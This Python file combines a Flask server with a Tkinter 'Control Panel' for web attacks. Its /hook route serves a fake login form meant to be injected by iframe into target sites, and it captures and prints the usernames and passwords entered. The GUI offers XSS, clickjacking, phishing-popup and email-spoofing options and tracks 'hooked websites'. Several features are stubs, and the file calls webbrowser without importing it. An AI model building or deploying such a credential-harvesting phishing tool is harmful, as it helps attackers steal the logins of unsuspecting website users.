import threading
import tkinter as tk
from tkinter import ttk
from flask import Flask, render_template_string, request, jsonify
import socket
import requests

#FLASK DO NOT EDIT
app = Flask(__name__)

# Hardcoded login credentials, change to credentials 
USERNAME = "USERNAME"
PASSWORD = "PASSWORD"

# List to store hooked websites (for demonstration)
hooked_web = []

# Route to provide the hook (iframe endpoint)
@app.route('/hook', methods=['GET', 'POST'])
def hook():
    if request.method == 'POST':
        # Capture the data (username, password) submitted through the iframe
        username = request.form.get('username')
        password = request.form.get('password')

        # For ethical purposes, print the credentials to the console (e.g., for testing)
        print(f"Captured credentials - Username: {username}, Password: {password}")

        # Simulate a successful data capture response
        return jsonify({"status": "Data captured successfully!"})

    # Serve a simple HTML form that will be injected via iframe on the target site
    return render_template_string('''
    <html>
    <head><title>Hook Page</title></head>
    <body>
        <h2>Welcome to the Hook Page</h2>
        <form method="POST" action="/hook">
            <input type="text" name="username" placeholder="Username" required />
            <input type="password" name="password" placeholder="Password" required />
            <input type="submit" value="Submit" />
        </form>
    </body>
    </html>
    ''')

# Function to get local and public IP addresses
def get_ip_addresses():
    # Local IP address (localhost)
    local_ip = '127.0.0.1'

    # Public IP address (using an external service)
    try:
        public_ip = requests.get('https://api.ipify.org').text
    except requests.exceptions.RequestException:
        public_ip = 'Unable to fetch'

    return local_ip, public_ip

# Tkinter UI Code
def create_tkinter_ui():
    def show_option(option):
        for widget in control_panel.winfo_children():
            widget.destroy()  # Clear previous content

        label = tk.Label(control_panel, text=f"{option} Attack", font=("Arial", 14), bg="white")
        label.pack(pady=20)

        if option == "XSS":
            tk.Label(control_panel, text="Enter Target Website:", bg="white").pack(pady=5)
            target_entry = tk.Entry(control_panel, width=30)
            target_entry.pack(pady=5)

            tk.Label(control_panel, text="Enter Payload:", bg="white").pack(pady=5)
            payload_entry = tk.Entry(control_panel, width=30)
            payload_entry.pack(pady=5)

            submit_btn = tk.Button(control_panel, text="Execute Attack", bg="#007BFF", fg="white")
            submit_btn.pack(pady=10)

    # Setup the Tkinter UI window
    window = tk.Tk()
    window.title("Control Panel")
    window.geometry("800x600")
    window.configure(bg="#f0f0f0")

    # Tab control at the top
    tabControl = ttk.Notebook(window)
    tabControl.pack(expand=1, fill="both")

    # Actions tab (Original UI)
    actions_tab = ttk.Frame(tabControl)
    tabControl.add(actions_tab, text="Actions")

    # Browsers tab (For managing hooked websites)
    browsers_tab = ttk.Frame(tabControl)
    tabControl.add(browsers_tab, text="Browsers")

    # Left panel for buttons
    left_panel = tk.Frame(actions_tab, bg="#d0d0d0", width=200)
    left_panel.pack(side="left", fill="y", padx=10, pady=10)

    # Right panel for actions
    control_panel = tk.Frame(actions_tab, bg="white")
    control_panel.pack(side="right", fill="both", expand=True, padx=10, pady=10)

    # Buttons with styling
    button_style = {"font": ("Arial", 12), "width": 18, "height": 2, "bg": "#007BFF", "fg": "white", "bd": 0}

    xss_btn = tk.Button(left_panel, text="XSS Attack", **button_style, command=lambda: show_option("XSS"))
    xss_btn.pack(pady=10)

    clickjacking_btn = tk.Button(left_panel, text="Clickjacking Attack", **button_style, command=lambda: show_option("Clickjacking"))
    clickjacking_btn.pack(pady=10)



    # Function to display social engineering options
    def show_social_engineering():
        for widget in control_panel.winfo_children():
            widget.destroy()  # Clear previous content

        label = tk.Label(control_panel, text="Social Engineering Techniques", font=("Arial", 14), bg="white")
        label.pack(pady=10)

        # Function to create popups with iframes
        def open_popup(title, iframe_url):
            popup = tk.Toplevel(window)
            popup.title(title)
            popup.geometry("400x300")
            popup.configure(bg="white")

            label = tk.Label(popup, text=title, font=("Arial", 12), bg="white")
            label.pack(pady=10)

            iframe = tk.Label(popup, text=f"iFrame: {iframe_url}", fg="blue", cursor="hand2", bg="white")
            iframe.pack(pady=5)
            iframe.bind("<Button-1>", lambda e: webbrowser.open(iframe_url))  # Opens URL in browser

            close_btn = tk.Button(popup, text="Close", bg="red", fg="white", command=popup.destroy)
            close_btn.pack(pady=10)

        # Social Engineering options
        fake_login_btn = tk.Button(control_panel, text="Fake Login Page", **button_style,
                                    command=lambda: open_popup("Fake Login Page", "http://localhost:5000/hook"))
        fake_login_btn.pack(pady=5)

        phishing_alert_btn = tk.Button(control_panel, text="Phishing Popup", **button_style,
                                       command=lambda: open_popup("Phishing Alert", "http://localhost:5000/phishing"))
        phishing_alert_btn.pack(pady=5)

        email_spoofing_btn = tk.Button(control_panel, text="Email Spoofing", **button_style,
                                       command=lambda: open_popup("Email Spoofing", "http://localhost:5000/email-spoof"))
        email_spoofing_btn.pack(pady=5)

    # Add Social Engineering button to Actions Tab
    social_engineering_btn = tk.Button(left_panel, text="Social Engineering", **button_style, command=show_social_engineering)
    social_engineering_btn.pack(pady=10)


    # --- Browsers Tab Content ---
    hooked_websites_frame = tk.Frame(browsers_tab, bg="white", padx=20, pady=20)
    hooked_websites_frame.pack(fill="both", expand=True)

    # Update hooked websites list
    def update_hooked_websites():
        for widget in hooked_websites_frame.winfo_children():
            widget.destroy()  # Clear previous list

        label = tk.Label(hooked_websites_frame, text="Hooked Websites", font=("Arial", 12, "bold"), bg="white")
        label.pack(pady=5)

        if not hooked_web:
            tk.Label(hooked_websites_frame, text="None", font=("Arial", 10), bg="white").pack()
        else:
            for site in hooked_web:
                site_label = tk.Label(hooked_websites_frame, text=site, font=("Arial", 10), bg="white")
                site_label.pack()

    update_hooked_websites()  # Show initial list of hooked websites

    # Input field to add/remove sites
    site_entry = tk.Entry(browsers_tab, width=30)
    site_entry.pack(pady=5)

    # Add site button
    add_button = tk.Button(browsers_tab, text="Add Site", bg="green", fg="white", command=lambda: hooked_web.append(site_entry.get()) or update_hooked_websites())
    add_button.pack(pady=5)

    # Remove site button
    remove_button = tk.Button(browsers_tab, text="Remove Site", bg="#007BFF", fg="white", command=lambda: hooked_web.remove(site_entry.get()) or update_hooked_websites())
    remove_button.pack(pady=5)

    # Display IPs in the browser section
    local_ip, public_ip = get_ip_addresses()

    # Display IPs under the browser section
    ip_section = tk.Frame(browsers_tab, bg="white", padx=20, pady=10)
    ip_section.pack(fill="both", expand=True)

    tk.Label(ip_section, text="Local IP: " + local_ip, font=("Arial", 12), bg="white").pack(pady=5)
    tk.Label(ip_section, text="Public IP: " + public_ip, font=("Arial", 12), bg="white").pack(pady=5)
    tk.Label(ip_section, text = "Local IP Hook: http://" + local_ip + ":5000/hook.js", font=("Arial", 12)).pack(pady=5)
    tk.Label(ip_section, text = "Public IP Hook: http://" + public_ip + ":5000/hook.js", font=("Arial", 12)).pack()

    window.mainloop()

# Login Frame Code
def login():
    def check_credentials():
        entered_username = username_entry.get()
        entered_password = password_entry.get()

        if entered_username == USERNAME and entered_password == PASSWORD:
            root.destroy()  # Close the login window
            create_tkinter_ui()  # Open control panel after login
        else:
            error_label.config(text="Invalid username or password", fg="red")

    # Login Window
    root = tk.Tk()
    root.title("Login")
    root.geometry("500x400")
    root.configure(bg="#f0f0f0")  # Light gray background

    login_frame = tk.Frame(root, bg="#e0e0e0", padx=20, pady=20)
    login_frame.pack(expand=True)

    # Username label and entry
    tk.Label(login_frame, text="Username", font=("Arial", 12), bg="#e0e0e0").pack(pady=5)
    username_entry = tk.Entry(login_frame, width=30)
    username_entry.pack(pady=5)

    # Password label and entry
    tk.Label(login_frame, text="Password", font=("Arial", 12), bg="#e0e0e0").pack(pady=5)
    password_entry = tk.Entry(login_frame, width=30, show="*")
    password_entry.pack(pady=5)

    # Error message label
    error_label = tk.Label(login_frame, text="", font=("Arial", 10), bg="#e0e0e0")
    error_label.pack(pady=5)

    # Login button
    login_button = tk.Button(login_frame, text="Login", font=("Arial", 12), bg="#007BFF", fg="white", width=15, command=check_credentials)
    login_button.pack(pady=10)

    root.mainloop()

# Function to run Flask in a separate thread
def run_flask():
    app.run(host='0.0.0.0', port=5000, threaded=True)

# Function to run both Flask and Tkinter using threads
def run():
    # Start Flask in a separate thread
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True  # Allow the program to exit even if Flask thread is running
    flask_thread.start()

    # Show the login page first
    login()

# Start the Flask server and Tkinter UI using threads
if __name__ == '__main__':
    run()
